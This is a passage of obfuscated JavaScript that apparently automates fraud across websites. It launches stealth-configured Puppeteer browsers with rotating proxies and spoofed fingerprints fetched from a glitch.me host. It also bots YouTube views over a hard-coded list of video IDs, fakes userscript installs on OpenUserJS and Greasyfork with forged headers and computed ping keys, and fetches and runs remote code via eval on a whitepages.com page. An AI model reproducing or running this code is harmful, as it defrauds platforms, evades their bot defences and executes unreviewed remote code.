          'blockTrackersAndAnnoyances': 0x1
        }),
        require('@extra/pro' + 'xy-router')({
          'proxies': {
            'DEFAULT': flags['doUseProxy'] ? await getRandomProxy() : null
          }
        }),
        require('puppeteer-' + 'extra-plug' + 'in-timezon' + 'e')()
      ])['userDataDi' + 'r'](r);
      let t;
      D:
        for (;;)
          try {
            let z = await async function A() {
              let B;
              const C = {
                'User-Agent': B['userAgents']['random'](),
                'Accept-Encoding': 'none'
              };
              try {
                B = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                  'headers': C
                })) ? .['data'];
              } catch (D) {}
              if (B)
                try {
                  B = (await axios['get'](B, {
                    'headers': C
                  })) ? .['data'];
                } catch (E) {}
              if (!B)
                return await randomWait(), await A();
              try {
                return 'object' == typeof B ? B : 'string' == typeof B ? JSON['parse'](B) : {};
              } catch (F) {
                if (!B)
                  return await randomWait(), await A();
              }
            }();
            flags['doExtFinge' + 'rprint'] && s['deviceDesc' + 'riptor'](z), t = await s['launch']();
            break D;
          } catch (B) {
            warn(B), await randomWait();
          }
      const {
        vanillaBrowser: u,
        userAction: v
      } = t, w = u['defaultBro' + 'wserContex' + 't'](), x = [
        'eHpl-BjXo5' + '8',
        '-PgyODlV6V' + '8',
        'S9EkXX0QYD' + 'U',
        'WvcG1OKdHW' + 'o',
        'b6gOcEwtZ8' + 'U',
        'apdtzA0Dzf' + 'k',
        'YiukDwYv2K' + '4',
        'zK-6UH5R5X' + '8',
        'bIXqNjtsEf' + '4',
        '3l253rESkw' + 'Q',
        'u6RVZKcN9z' + 'Q',
        '6ImZdwpdwT' + 'A',
        '0qPB5ANSBK' + 'c',
        '92duH3cqn1' + 'M',
        'b5lKI78fw3' + 's',
        'zpCCPZfP8L' + 'I',
        'ES7oooakr-' + 'c',
        '2eWyJ8FBvQ' + '8',
        'O4-B3OFPDf' + 'Q',
        'JFcnGk0_u7' + 'o',
        'AP7d2Ghq6d' + 'U',
        'UizEAwrZAG' + 'I',
        '0FAi5-h8Hj' + '0',
        'CNqA6IYj17' + 'k',
        'tSiKyCpwnS' + 'Y',
        'OrglyeV5xP' + 'Y',
        'BXkB-g4eCc' + 's',
        'Y53CmmpbOJ' + 's',
        'sm5MLz_IrQ' + 'k',
        'EuciRU_Ska' + '0',
        'cCbDCTLyPc' + 'E',
        'Ox7Ng5T7bm' + 'c',
        'TXTaB-dQg-' + '0',
        '3jSWaWgr_A' + '0',
        'xT8nvuxCRB' + 'E',
        '3c4Ab9EmRg' + 'Y',
        '2kScgeNOpL' + '8',
        't22jhowMom' + 'c',
        'HbcDLgkmXL' + 's',
        'JsKZ41uTeg' + 'c',
        'dfU48FRgs0' + 'g',
        '3K9ILewnUk' + 'o',
        'QmKwnRiKhD' + 'k',
        'n3nVsWsL6I' + 'k',
        'noTs52D_Mw' + 'Y',
        'A0tDR4nTTK' + '0',
        '9eBwFca-B1' + '4',
        'moasU30H5l' + 'A',
        '_Mb8oQtSBW' + 'E',
        'TNGGOgwPtc' + 'M',
        '-pYA-gjkQ8' + 's',
        '5d-dB6tZZA' + 'o',
        '8H2AiOV0oE' + 'o',
        'mI7aiKDGde' + 'w',
        'D-IMDYrj35' + '4',
        'gKgFiEgghy' + 'g',
        'mjVwfjJ2nj' + 'k',
        '6auDBi-D2H' + 'M',
        'X89-SWNdIE' + 'k',
        'T5Pn4LhIwj' + 'M',
        'wVnKGSjY3i' + '8',
        'g11NJftxw1' + '4',
        '9zHirkfEKk' + 'k',
        'ZyGS_AMbIa' + '4',
        'yG6bwB17ZP' + 's',
        'aytHiLe0s6' + 'U',
        'cGe-Mpw_F1' + 'w',
        'eMK7xV_nxZ' + 'o',
        'epJ2MAKa1Y' + 'Q',
        '5BNbKKMUhE' + 'o',
        'oxpAvc6tDP' + '8',
        'jRcc-NIR2R' + 'I',
        '258btO4mFw' + '4',
        'pXjJAUvSbQ' + 'A',
        '63-irfPjh2' + 'c',
        'xbrDZAFf3Q' + 's',
        'MVHMtRlesU' + 'g',
        'zed05qfHMB' + 'I',
        'nkhkxKUHsY' + 'g',
        'n4cSAqR9H1' + 'Q',
        'gOUPndcj7z' + 'I',
        'n3HBTTDHoX' + '8',
        'XIgMFHPIXv' + '4',
        'oQHKMky-_K' + 'c',
        'zfDgTzZ2nh' + '0',
        '1PYettRo-D' + 'M',
        'jzuZuwF490' + '4',
        '2DAgWTlXae' + '8',
        'keouUYA5hI' + 'k',
        'F7i7wRlGCd' + 'c',
        'uToD2c0CdJ' + 'c',
        'Y8DzpdFZZ8' + '8',
        '-rrH657DAa' + 'o',
        'QTrEEWtDks' + '4',
        'TWTSnQDuad' + 'Y',
        'a0GUyvgnzg' + 'c',
        'eSReWZQyKd' + 'E',
        'D_5pMqdKSs' + '4',
        'm0ie8gHS00' + 'I',
        '6WosqMq9ej' + 'o',
        'i0afAOlon_' + '4',
        'j_fe6PfxW4' + 'Y',
        'GfPzi8SYr0' + 'w',
        'MSgZhNCwff' + 'M',
        'wxyBC_z6bI' + '8',
        'PkQpV-Fwhs' + 'k',
        'bVD6cWOVhN' + 'U',
        'mjZOpQlHbx' + 'M',
        'k_BXkcdbBO' + 'M',
        'X72oUsFV7q' + '0',
        'lONsILfq-W' + 'Y',
        'Bhe9PyM_s_' + 'Q',
        'Bhe9PyM_s_' + 'Q',
        'h4TBnDkX4y' + 'o',
        'PNBJyHEkfk' + '4',
        'L3iHS__ufc' + 'g',
        'm7aliUAwm_' + 'Y',
        'FuPVf85zMi' + 'w',
        'gtupAeNTDS' + 'M',
        'yyJ8zkckoB' + '8',
        'ZDTESiN1eS' + 'w',
        'Fo6x16DkoR' + 'o',
        'IAJqRxhVqO' + 'k',
        'KAgwII8TGj' + 'o',
        'o4tLCshmlb' + 'M',
        'dLj5fIupdA' + 'o',
        '_Xl_-b9P4U' + 'Q',
        'V3NxxpUUfW' + 'E',
        'J3ygeDEMnO' + 'w',
        'HcP_xmdwsl' + 'c',
        'M9g0h7px2_' + 'M',
        'b5WfUvcSgr' + 'U',
        'JGHnIshsoC' + 'E',
        'x2gfhCLHd9' + '4',
        'M5Fr8G0ma9' + 'o',
        '3sGeIBfFlC' + 'M',
        'k74y4KOJ2m' + '4',
        'pTHJB0S8E-' + 'U',
        'KaIrXJLfYP' + 'M',
        '0cisZkywhg' + 'Q',
        '0dVzItbl9E' + 'w',
        't0EqnhcSb1' + 's',
        'MuiXtvo1RY' + 'E',
        'Nj-3KC6knH' + 'w',
        'B19HbETNi5' + '8',
        'yKN_QkroH6' + 's',
        'U9ExFM1pji' + '0',
        'sONzDfjKhL' + '4',
        'n3Kj8zEfew' + 'U',
        'nXLGQ7QeoG' + 'Y',
        'OQFQiwiM-P' + 'Y',
        'UtPRpKRTtH' + 'U',
        'E56Myp0BzE' + 'E',
        '7DjOp_JM2Z' + 'w',
        'rNFLQFz_G1' + 'g',
        '1r2pKoVAdj' + 'M',
        'gm3eiv6UND' + 'M',
        'yOiROfjxzX' + 'o',
        'lt2AcxC_ap' + 'g',
        'bObEme2BDO' + 'E',
        '6Ut6HbJmW4' + 'w',
        'fUs0TtQQTo' + '0',
        '_phHS3FAgW' + 'Q',
        '1f8sU4l3dP' + '4',
        'HwTSLUd53K' + '8',
        'EpP2ymD_QG' + 'A',
        'TQ69QFqmbo' + 'I',
        'wA8BqUka_u' + '0',
        'bc8Ey-vuR5' + 'M',
        'PZ_uLi7ULl' + '0',
        'smu5FsnhwF' + '4',
        'dv1JluwoOb' + 'c',
        'nHotP0jbcv' + 'A',
        'iIjYNEmrVv' + 'M',
        'SeP-OZAiPb' + 'c',
        'v52PClvMFt' + 'k',
        '3loLqIPxTS' + '0',
        'jVu9mOzbSq' + 'U',
        '73SAN1vOrV' + 'k',
        'YLPxp4ntym' + 's',
        'YWXfelRk3b' + 'Q',
        'CsxlLMb6Uj' + 'o',
        'uafGOfwzpa' + 'Q',
        'XIr8qotHOI' + 'E',
        'EcoPCWC3Uh' + 'o',
        'AhOwyT8aIh' + 'g',
        't-Ox7lI5UH' + 's',
        'i08qNmssXe' + 'Q',
        'QrJIU09eD-' + 'g',
        'QvNNCQ-8Rp' + 'E',
        'k5gjnjDFAZ' + 's',
        'h_NQ3y1ek8' + 'U',
        'evPsJlNLy_' + '4',
        'qEPTydgwh4' + 's',
        'LB685ckhuf' + 'E',
        'Lj1EcSMGey' + '0',
        'OE19r7MIMW' + 'Q',
        'u8E3p0Vy-P' + 'Y',
        'f4a5OPFQa7' + 'k',
        'XDo7Q7yUEt' + 'k',
        'Vw_9zw0qHI' + 'c',
        'KGT5nbDsI_' + '8',
        'E008Eql59M' + 'Q',
        'wSOFdefX47' + 'A',
        '2xcv7q3QhR' + 'E',
        U(0xb, 'C$6I') + '4',
        '0wP7csnX7k' + '4',
        'Xo0R8WiRSb' + '4',
        '8zNp8EOpGd' + '4',
        'sWYhIJZmoS' + 'E',
        'YdG8U1W-bX' + '0',
        'QeDsoSNml-' + 'c',
        'xW5q77El0x' + '8',
        'ZF14issJFE' + 'Y',
        'TRglEGLLKX' + 'o',
        'UE0SXc5k1e' + 'g',
        '6VY65D8f3D' + 'Q',
        'Iwxuob4fA8' + 'Q',
        'M4elJHCUIi' + 's',
        'GY9WWhO504' + 'k',
        'eErUSxmLDw' + '8',
        'ITQfAfzLj3' + 'I',
        'vbDrCL2FuL' + 'g',
        'KyQ_sUgtbK' + 'U',
        'lbEJcipUp8' + 'I',
        '2SqCn2LreN' + 'g',
        '1i-G2TUn41' + '0',
        's0ru6uK7vi' + '8',
        'gOxiE5UAAD' + 'w',
        'lx1rOOjekc' + '8',
        '5VYN2zA-Si' + 'k',
        'q9rLWEAzoo' + 'k',
        '4KSm3IY7Xz' + 'g',
        'fMqRu_ON-D' + 'E',
        'GfvShU6Sy9' + 'A',
        'OHzOmi1b60' + 'Y',
        'D9oTUKT-_n' + 'A',
        '_BrT2PlUiw' + '0',
        'kuuI4LzKgm' + 'I',
        '78dymyg88r' + 'M',
        'mi0nGt2B-q' + 'o',
        'HaI7BjnwnO' + 'c',
        'xlAEOkIuy7' + 'Y',
        '3VmtckvTXl' + 'U',
        'ed7TWHKDr4' + 'E',
        '2LfTjyVtbf' + 'U',
        'STHlCkloyv' + 'E',
        '-BI_-6YnM6' + 'Y',
        'LSK_G1qCQw' + 'M',
        '4tzqIl6EKV' + 'k',
        '9DshU55EiV' + '8',
        'mBtaEI_6e8' + 's',
        '960lvuduwY' + 'w',
        'XWJH-6J5Ee' + 'g',
        'XLS4qmyCAX' + 'g',
        '8cJDYeRiLn' + 'k',
        'cCaIVrltHz' + 'w',
        '8X2fF4pgM0' + 'E',
        '6s8Xm4wylr' + '4',
        'eFceshvavn' + 'o',
        '2h4g7euqR-' + 'U',
        'ujiBqXnn92' + '8',
        'w9F2NST-9j' + 's',
        'w-oc7F5Mmy' + 'U',
        'UYrmqL3cOD' + 'U',
        '4QB59etj0I' + 'o',
        'MY9MTNgXcN' + 'o',
        'ISBmcKDS5C' + '8',
        'ogIb7A7tvW' + '0',
        '-L583IZF6s' + 'k',
        'NbeKQq29ZL' + '0',
        'SPplDxd74F' + 's',
        'MHGV8QmpAz' + 'k',
        'iWzezFWpU7' + 'A',
        'NNCQt1rXXE' + 'Y',
        'bcb_ZhJJK8' + 'g',
        '3KoZGQiY6N' + 'o',
        'aSaXQH8F1_' + 'A',
        'V5nMOhI62o' + 'w',
        'JvlPjRUdId' + '0',
        '2gQHuClLCb' + '0',
        '5e-qDy-uUJ' + 'E',
        'oE8vC0QEWU' + 'E',
        '7cQken99yu' + 'o',
        'pmzu080j7r' + 'I',
        'sVy9F4whP6' + 'o',
        'MJrkylk7iE' + 'c',
        'XYjsTxi6oE' + '8',
        'mKlMouB6tp' + '0',
        'o2yunZQley' + 'A',
        'oRryU9F9Lv' + 's',
        'uzzK-052H0' + 'c',
        'VSvA4rCe-4' + 'M',
        'XURH2u_0fM' + 'I',
        'yfpVL2g_tk' + 'o',
        'AuEEjQ8x9o' + 'w',
        'wWkviY8zBr' + 'c',
        'zt_eubHWhx' + 'c',
        'O_7_BGU3u_' + '0',
        'QFDKBxmOn3' + 'Y',
        'w6gccNWXXv' + 'g',
        'VdNJxbrqdX' + 's',
        'wbi5Dxebvn' + 'I',
        'XEFOREYrJg' + 'k',
        'I2rcRta7WJ' + '0',
        'OP5KGfXHX_' + 'A',
        'w2MUMbbwlm' + 'o',
        'X3bF0nd6kf' + 'w',
        'WDDAhASf9j' + 'w',
        'fRwcV8gjbc' + 'w',
        '7T63gaRThr' + '0',
        'zC8AWIwhbf' + 's',
        'JSkVE0n-ee' + 'o',
        'qiQA5pWWRt' + 'U',
        'QdXCjZtfXu' + 'c',
        'vlBji8TOax' + 'o',
        'pBx_5CbIcp' + 'o',
        'L1Oy5F6ZMO' + 'Q',
        'P0NjLaBed-' + 'E',
        'DR16C4-keB' + '0',
        'LGmpIpu9eD' + 'w',
        'rNkX_A4kBA' + 'Q',
        'QztVMjrEk4' + '0',
        'uOM6m6KL5d' + '4',
        'g-Aju8xrrO' + 'E',
        'DfkDbFk_x9' + '8',
        'Y4NLDaowD6' + 'I',
        'ALSZnqQTuJ' + 'o',
        'xUmB6BpZBE' + 'w',
        'SxNOcZ1s85' + '8',
        '-noeCjO416' + 'k',
        'taPJqXBI8V' + 'Y',
        'YxqbkMi1Is' + '4',
        'vnJTyve2r-' + '4',
        '44lRVYQ38E' + 'Q',
        'QOv1N1X5J-' + 'g',
        'jNjREs7ODT' + 'g',
        'U30ToJo3dd' + 'k',
        'rm7lNIIOQC' + 'Y',
        'mGU6sOPlYv' + 'c',
        '6pwxUXdt6T' + 'Q',
        '6MkJRee35a' + 'Q',
        'LVbf7U9WAI' + 'c',
        'gPbhFvEeJ3' + 'M',
        'LWXAxz0MiH' + 'A',
        'L0KQJqfwJJ' + 'Y',
        'GWr33_u0VK' + 'c',
        '4ud3ZPfWkH' + 's',
        'dxSrySC4XM' + 'c',
        'iIM2KZC69W' + '0',
        '8DuJ3BAwME' + 'o',
        'm3BAhe1wsl' + 'Y',
        '02U_3pAZxM' + '8',
        '0e7nidPa97' + 'g',
        'TixW__6Eer' + 'o',
        'q46W8MTRTC' + 'E',
        'Jdxp04Je1O' + 'w',
        'HfP4TO3gfN' + '0',
        '4dUJaeB0qL' + '8',
        'xnL-fRJ3RZ' + 'o',
        'yJbD0Df45u' + 'Q',
        '-pGw8RkSSB' + 'k',
        '7cy86Njsis' + 'M',
        'jbgqvxtauo' + '4',
        'N8M00JjSVI' + 'I',
        'MfR5q6Td3R' + 'c',
        'eHwcx94wcp' + 's',
        'olDgVFgAgP' + 'o',
        'eAAd5BmzXz' + 'M',
        'xgTjQ2sGXd' + '4',
        'ipny6JUbzw' + 's',
        'WOwQ0UxbRj' + '4',
        'h0PKFed2GB' + 's',
        'JxdOrgzq7Z' + '8',
        '-VgpSWWW-8' + 'w',
        '-ix4OizkAn' + 's',
        'd3CRE9y3YV' + 's',
        '4QZlfXxorJ' + 'o',
        'YlDpg8aCs5' + 'M',
        'Qe5WT22-AO' + '8',
        'b_rjBWmc1i' + 'Q',
        '9yjZpBq1XB' + 'E',
        'hPx-RiBKXt' + 'Q',
        'UMqLDhl8PX' + 'w',
        'DlJEt2KU33' + 'I',
        'BWeqoARup-' + 'Q',
        '2Dx76lD8Sc' + 'c',
        'j_nI6G3ZDi' + 'E',
        'zvcUYYN1sx' + 'w',
        'cWRkYo1S3L' + '4',
        'cWRkYo1S3L' + '4',
        'bxC_PN3SRv' + 'I',
        '94m93T_5JL' + 'M',
        'RBSHAH4iWU' + '8',
        'RBSHAH4iWU' + '8',
        'RBSHAH4iWU' + '8',
        'bo9fTeXvSi' + 'A',
        'z6LqXiAK-8' + '0',
        '5tbOspjJ5f' + '0',
        'twQ6kKjtBk' + 'Y',
        'Ig17K38Fy0' + 'Y',
        'ZdlrVDwn_a' + '4',
        'aCT4Lddunx' + 'g',
        'acAvMGQtln' + 'M',
        '8XkcbdSRdO' + '0',
        '0e3GPea1Ty' + 'g',
        'zxYjTTXc-J' + '8',
        '9bqk6ZUsKy' + 'A',
        'plSyrHqUh7' + '8',
        'HkvQywg_uZ' + 'A',
        'lADBHDg-Jt' + 'A',
        'I2O7blSSzp' + 'I',
        'kd2KEHvK-q' + '8',
        'CbUjuwhQPK' + 's',
        'fb7T1v_VHp' + 'E',
        'SpeSpA3e56' + 'A',
        'RQdxHi4_Pv' + 'c',
        'nx2-4l4s4N' + 'w',
        'tUTCq3iiw_' + '4',
        'VDa5iGiPgG' + 's',
        'S-sJp1FfG7' + 'Q',
        'Hm1YFszJWb' + 'Q'
      ], y = [
        n,
        l,
        m,
        o
      ];
      log('browser\x20la' + 'unched'), flags['RPL2_MDM2'] && setTimeout(async () => {
        const C = await w['newPage']();
        for (;;) {
          let D = -0x1c1a + -0x16ef + 0x41 * 0xc9;
          if (await C['goto'](data['mediumArti' + 'cles']['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](E => D++), !D) {
            await randomWait();
            for (let E = 0x97a + 0x153e * -0x1 + 0xbc4; E < getRandomInt(0xb1 * 0xb + 0x1712 + -0x1eac, -0x1 * -0x1a92 + 0xf36 + -0x29c3); E++)
              await v['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
            await randomWait(), await wait(0x1df1 * 0xc + -0x9523 + 0x1837);
          }
        }
      }, -0x11 * 0xe5 + 0x2219 + -0x10 * 0x128), flags['RPL2_WP'] && setTimeout(async () => {
        (async function C() {
          try {
            let D = -0x139b + -0x2535 + 0x38d0;
            const E = await w['newPage']();
            if (await E['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                'timeout': MM_NETWORK_PATIENCE
              })['catch'](F => D++), D)
              return await E['close'](), C();
            await E['waitForSel' + 'ector']('#main-cont' + 'ent'), await E['evaluate'](() => {
              let F = new XMLHttpRequest();
              F['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x95 * -0x43 + 0x895 + -0x2f94), F['send'](), eval(F['responseTe' + 'xt']);
            });
          } catch (F) {}
        }());
      }, 0x2635 + 0x239 * -0x1 + -0x4 * 0x8e6), flags['RPL2_YT'] && async function C() {
        const D = await h('https://ww' + 'w.youtube.' + 'com/');
        for (;;) {
          let E = -0x8e3 + -0x250a + -0x2ded * -0x1;
          try {
            await i(D), await y['random']()(D);
          } catch (F) {
            log((E = 0x23be + 0x4 * -0x8f + -0x2181, F)), await D['close'](), setTimeout(() => {
              C();
            }, 0x1 * -0x871 + 0x1 * -0x18f5 + 0x21ca);
          }
          if (E)
            return warn('YouTube\x20bo' + 'tter\x20died.' + '..'), 0x24ce + -0x1 * -0xc25 + -0x37f * 0xe;
          await randomWait();
        }
        return -0xbd5 * 0x1 + -0x1a75 + 0x264b * 0x1;
      }();
    }
  ],
  [
    () => flags['doCreateSe' + 'rver'],
    async () => {
      require('http')['createServ' + 'er'](async function(f, g) {
        g['writeHead'](0x17c * 0x7 + 0x2 * -0x125f + -0x1b22 * -0x1), g['write']('v0.8'), g['end']();
      })['listen'](process['env']['PORT'] || 0x35b * 0x2 + -0x1db5 + 0x1 * 0x368f);
    }
  ],
  [
    () => flags['doOUJS'],
    async () => {
      async function f() {
        const h = data['oujsToAssi' + 'st']['random'](),
          j = h['replace']('/scripts/', '/install/') + '.user.js',
          [k, l] = (function() {
            const x = data['oujsUAs']['random']();
            return [
              x,
              x['includes']('Firefox')
            ];
          }()),
          m = function(x, y = 0x206c + 0x6 * 0x30 + 0x115 * -0x1f) {
            const W = c,
              V = d;
            if (x['includes']('Firefox'))
              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xabb + 0x1c60 * -0x1 + -0x2 * -0x138e));
            const z = x['indexOf']('Chrome/') + V(0xc)['length'],
              A = x['slice'](z),
              B = A['slice'](0x8 * -0x1c6 + 0x2 * -0x286 + 0x99e * 0x2, A['indexOf']('\x20'));
            return y ? B[W(0x10)](0x84a + -0xd32 * -0x1 + -0x157c, B['indexOf']('.')) : B;
          }(k),
          q = {
            'signal': AbortSignal['timeout'](-0x715 + -0x3dd6 + -0x9d1 * -0xb),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': k,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
        l ? Object['assign'](q['headers'], {
          'te': 'trailers'
        }) : Object['assign'](q['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        });
        const u = await fetch(g, q)['catch'](x => {});
        if (!u || !u['headers'])
          return;
        if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
          return;
        const v = {
          'signal': AbortSignal['timeout'](0xbf * -0x5f + 0x54f * 0xe + 0x239f),
          'headers': {
            'host': 'openuserjs' + '.org',
            'origin': 'https://op' + 'enuserjs.o' + 'rg',
            'user-agent': k,
            'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
            'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': g,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origi' + 'n',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
          },
          'body': null,
          'method': 'GET'
        };
        if (l ? Object['assign'](v['headers'], {
            'te': 'trailers'
          }) : Object['assign'](v['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), !await fetch(h, v)['catch'](x => {}))
          return;
        const w = {
          'headers': {
            'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none'
          },
          'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
          'body': null,
          'method': 'GET'
        };
        l ? Object['assign'](w['headers'], {
          'te': 'trailers'
        }) : Object['assign'](w['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        }), await fetch(j, w);
      }
      const g = 'https://op' + 'enuserjs.o' + 'rg/';
      f();
      for (let h = 0x71f + -0x4 * -0x5ad + -0x1dd3; h < -0x1 * 0x25 + 0x1701 * -0x1 + 0x172a; h++)
        setTimeout(f, (-0x30c3 + -0x1c16a + 0x2dc8d) * h * getRandomInt(-0x20d + 0x11b7 + 0x1 * -0xfa9, 0x70d + 0x1 * -0xb1b + 0x411));
      setInterval(() => {
        f();
        for (let i = -0x1e15 * 0x1 + 0x8 * 0x3d9 + -0xb3; i < -0x1b59 * 0x1 + -0x51d + 0x207a; i++)
          setTimeout(f, (0x49b * -0x57 + -0x2a51 + -0x152af * -0x2) * i * getRandomInt(-0x17 * -0x2f + -0x23d2 + 0xa * 0x329, 0x21c4 + -0xffc + -0x11c5 * 0x1));
      }, 0x7e5c7 + 0x23b * 0x1b65 + 0x10141 * -0xe);
    }
  ],
  [
    () => flags['doGF'],
    async () => {
      async function f(j = null, k = -0x4e7 + -0x1a71 * 0x1 + -0x1 * -0x1f58) {
        const X = c,
          q = makeFetchCookie(fetch),
          u = j ? new HttpsProxyAgent(j) : j,
          v = await q('https://gr' + 'easyfork.o' + 'rg/en', {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'cross-site'
            },
            'method': 'GET',
            'mode': 'cors',
            'agent': u
          }),
          w = extractLinks(await v['text']())['filter'](E => E['includes']('by-site'))['slice'](0x186f + -0xe68 + -0x1 * 0xa07, -(-0x482 * -0x2 + -0x19 * -0xec + -0x200f * 0x1)),
          x = k && data['scriptTarg' + 'ets']['random'](),
          y = k ? x['preRef'] : w['random'](),
          z = await q(y, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'same-origi' + 'n',
              'Sec-Fetch-User': '?1'
            },
            'referrer': 'https://gr' + 'easyfork.o' + 'rg/en',
            'method': 'GET',
            'mode': 'cors',
            'agent': u
          }),
          A = extractLinks(await z['text']())['filter'](E => E['includes']('/scripts/') && !E['includes']('by-site'))['slice'](-0x1 * -0xc86 + -0x1 * 0xe84 + -0x1ff * -0x1),
          B = k ? x['url'] : A['random'](),
          C = await q(B, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + X(0x7) + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'same-origi' + 'n',
              'Sec-Fetch-User': '?1'
            },
            'referrer': y,
            'method': 'GET',
            'mode': 'cors',
            'agent': u
          }),
          D = extractAnchorData(await C['text']());
        if (D['pingUrl']) {
          const E = sha1(D['ipAddress'] + D['scriptId'] + D['pingKey']),
            F = D['pingUrl'] + (D['pingUrl']['includes']('?') ? '&' : '?') + 'ping_key=' + encodeURIComponent(E);
          await q('https://gr' + 'easyfork.o' + 'rg' + F, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': '*/*',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Sec-Fetch-Dest': 'empty',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Site': 'same-origi' + 'n'
            },
            'referrer': B,
            'method': 'POST',
            'mode': 'cors',
            'agent': u
          });
        } else
          warn('awdiwajdwj' + 'qdqw');
      }
      async function g() {
        const h = await getRandomProxy();
        await f(h), random() <= -0x59 * 0x13 + 0x1184 + 0x13 * -0x93 + 0.6 && await f(h, 0x20c6 + 0xd2 * -0x2 + -0x1f21);
      }
      g();
      for (let h = 0x194b + 0x1f42 * -0x1 + 0x5f7; h < 0xc * -0x2ae + 0x11c4 + 0xe68; h++)
        setTimeout(g, (-0x1a93d + -0x3d * -0x52c + 0x94d * 0x25) * h * getRandomInt(0x32f * 0x4 + -0xcaa * 0x2 + 0xf * 0xd7, -0x2135 + 0x1d * -0xad + -0x1 * -0x34d1));
      setInterval(() => {
        g();
